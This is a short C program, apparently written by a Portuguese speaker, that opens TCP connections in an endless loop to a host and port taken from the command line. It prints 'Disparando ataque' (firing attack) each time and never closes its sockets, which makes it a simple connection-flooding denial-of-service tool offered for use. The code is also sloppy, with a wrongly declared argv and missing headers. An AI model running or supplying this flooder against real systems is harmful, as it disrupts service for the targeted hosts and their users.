#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main(int argc, char **argv[]){

        int meusocket;
        int conecta;

        int i;
        char *destino;
        int porta;
        i = 0;
        destino = argv[1];
        porta = atoi(argv[2]);

        struct sockaddr_in alvo;

        for(i;;i++){

        meusocket = socket(AF_INET,SOCK_STREAM,0);
        alvo.sin_family = AF_INET;
        alvo.sin_port = htons(porta);
        alvo.sin_addr.s_addr = inet_addr(destino);

        conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

        printf("%i - Disparando ataque no host %s, na porta %i \n",i,destino,porta);

        }
}
